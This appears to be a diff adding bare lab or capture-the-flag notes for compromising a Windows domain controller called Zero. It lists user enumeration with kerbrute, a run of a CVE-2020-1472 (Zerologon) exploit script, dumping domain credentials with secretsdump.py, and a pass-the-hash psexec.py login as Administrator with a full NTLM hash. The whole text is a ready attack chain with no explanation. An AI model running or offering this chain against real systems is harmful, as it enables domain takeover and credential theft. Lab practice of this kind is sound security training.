@@ -1,0 +1,11 @@
+Nmap
+Enum4linux
+~/go/bin/kerbrute userenum --dc Zero.csl -d Zero.csl user.txt
+
+python3 cve-2020-1472-exploit.py Zero-DC 172.31.1.29 
+
+secretsdump.py -just-dc 
+secretsdump.py -no-pass -just-dc zero/'Zero-DC$'@172.31.1.29 
+
+psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:36242e2cb0b26d16fafd267f39ccf990 Administrator@172.31.1.29
+
